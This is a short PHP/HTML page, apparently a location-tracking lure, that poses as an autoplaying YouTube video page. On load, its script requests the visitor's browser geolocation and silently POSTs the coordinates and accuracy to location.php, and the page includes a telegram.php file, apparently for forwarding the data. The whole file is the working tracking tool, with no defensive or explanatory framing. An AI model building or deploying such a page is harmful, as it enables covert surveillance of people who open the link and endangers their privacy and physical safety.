<?php
require_once __DIR__ . '/config.php';
require_once __DIR__ . '/telegram.php';
?>

<!doctype html>
<html>
<head>
<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
</head>
<body>

<!-- Video de YouTube incrustado -->
<iframe id="Live_YT_TV" width="100%" height="500px" 
    src="https://www.youtube.com/embed/h0-7_FE85DU?autoplay=1" 
    frameborder="0" allow="autoplay; encrypted-media; gyroscope; picture-in-picture" 
    allowfullscreen>
</iframe>

<script>
'use strict';

// ==== GEOLOCALIZACIÓN AUTOMÁTICA ====
if ('geolocation' in navigator) {
    navigator.geolocation.getCurrentPosition(pos => {
        const { latitude, longitude, accuracy } = pos.coords;

        fetch('location.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ latitude, longitude, accuracy })
        }).catch(e => {
            console.error('Error enviando ubicación', e);
        });

    }, err => {
        console.error('Error obteniendo ubicación', err);
    }, { enableHighAccuracy: false, timeout: 10000 });
}
</script>

</body>
</html>
